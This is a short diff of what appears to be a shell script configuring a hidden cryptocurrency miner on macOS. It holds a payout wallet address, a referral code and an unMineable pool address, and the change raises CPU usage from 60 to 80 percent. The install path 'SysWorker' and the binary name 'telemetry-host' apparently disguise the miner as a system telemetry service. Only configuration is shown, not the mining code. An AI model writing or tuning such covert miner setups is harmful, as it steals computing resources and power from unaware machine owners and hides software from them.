@@ -6,7 +6,7 @@ COIN="USDT"
 WALLET="0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
 REF_CODE="rbi3-l12f"
 POOL="rx.unmineable.com:3333"
-MAX_CPU_USAGE=60
+MAX_CPU_USAGE=80
 
 INSTALL_DIR="/Library/Application Support/SysWorker"
 BIN_NAME="telemetry-host"
